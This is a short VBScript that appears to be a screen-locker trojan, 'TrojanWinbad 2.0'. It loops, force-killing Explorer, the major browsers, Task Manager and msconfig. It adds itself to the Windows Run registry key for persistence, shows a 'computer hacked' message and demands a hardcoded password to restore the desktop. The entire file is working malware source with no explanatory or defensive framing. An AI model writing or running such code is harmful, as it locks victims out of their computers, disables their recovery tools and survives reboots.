Do
set t=CreateObject("Wscript.Shell")
set kill = CreateObject("Wscript.Shell")
set pro = CreateObject("WScript.Shell")
kill.run"taskkill /f /im explorer.exe >nul"
kill.run"taskkill /f /im chrome.exe >nul"
kill.run"taskkill /f /im opera.exe >nul"
kill.run"taskkill /f /im firefox.exe >nul"
kill.run"taskkill /f /im yandex.exe >nul"
kill.run"taskkill /f /im taskmgr.exe >nul"
kill.run"taskkill /f /im msconfig.exe >nul"
strKeyPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
strValueName = "TrojanWinbad 2.0.vbs"
strValue = "C:\Windows\TrojanWinbad 2.0.vbs"
pro.RegWrite strKeyPath & "\" & strValueName, strValue, "REG_SZ"
MsgBox"Your computer hacked by Winbad" ,48, "Winbad"
x = InputBox("Windows lock. TrojanWinbad 2.0 by sek13. Write password for unlock windows" ,96, "Write password")
if (x = "131433") then
MsgBox"Bye bye" ,32, "Trojan"
t.run"explorer.exe"
exit do
else
Msgbox"Wrong password" ,48, "Trojan"
end if
loop
